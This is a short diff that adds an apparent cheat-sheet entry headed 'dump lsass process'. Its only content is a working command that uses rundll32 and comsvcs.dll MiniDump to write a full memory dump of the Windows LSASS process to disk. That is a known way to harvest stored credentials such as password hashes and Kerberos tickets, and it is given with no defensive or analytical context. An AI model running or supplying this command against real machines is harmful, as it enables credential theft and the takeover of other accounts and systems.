@@ -1,0 +1,3 @@
+# dump lsass process
+rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id <fullPath>\lassdump.dmp full
+
